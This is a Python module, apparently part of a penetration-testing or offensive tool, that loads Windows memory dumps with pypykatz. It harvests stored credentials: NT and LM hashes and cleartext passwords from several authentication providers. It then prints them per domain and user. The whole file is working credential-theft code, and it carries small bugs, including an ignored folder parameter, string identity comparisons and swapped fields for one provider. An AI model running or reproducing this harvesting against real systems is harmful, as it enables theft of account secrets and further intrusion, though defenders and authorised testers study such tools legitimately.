# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import os, logging, glob
from core.Colors import *
from core.Paths import *
from core.Utils import *
from pypykatz.pypykatz import pypykatz


def parseDumps(dumpFolder):
	logging.warning("%sParsing every minidump of %smisc/dumps%s." % (warningGre, green, white))

	credentials = []
	results = {}
	dico = {}

	globdata = os.path.join(dumpDir, '*.dmp')
	
	for filename in glob.glob(globdata):
		try:
			mimi = pypykatz.parse_minidump_file(filename)
			results[filename] = mimi
			logging.info("%s   %s: %sdone%s." % (infoYellow, filename, green, white))
		except Exception as e:
			logging.warning("%s   Parsing %sfailed%s on %s%s%s. Err: %s" % (warningRed, red, white, red, filename, white, e))

	for result in results:
		for luid in results[result].logon_sessions:
			dico = results[result].logon_sessions[luid].to_dict()

			for cred in results[result].logon_sessions[luid].msv_creds:
				credentials.append((cred.domainname, cred.username, 'NA', (cred.LMHash.hex() if cred.LMHash else 'NA'), (cred.NThash.hex() if cred.NThash else 'NA')))

			for cred in results[result].logon_sessions[luid].wdigest_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].ssp_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].livessp_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].kerberos_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].credman_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domain, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].tspkg_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.username, cred.domainname, cred.password, 'NA', 'NA'))

	credentials = list(skip_duplicates(credentials))
		
	logging.warning("%s Following %scredentials%s were retrieved:" % (warningGre, green, white))
	for credential in credentials:
			print("")
			print("\t\t  domain: ", credential[0])
			print("\t\tusername: ", credential[1])
			if credential[2] is not 'NA':
				print("\t\tpassword:  %s%s%s" % (green, credential[2], white))
			if credential[3] is not 'NA':
				print("\t\t  lmhash:  %s%s%s" % (green, credential[3], white))
			if credential[4] is not 'NA':
				print("\t\t  nthash:  %s%s%s" % (green, credential[4], white))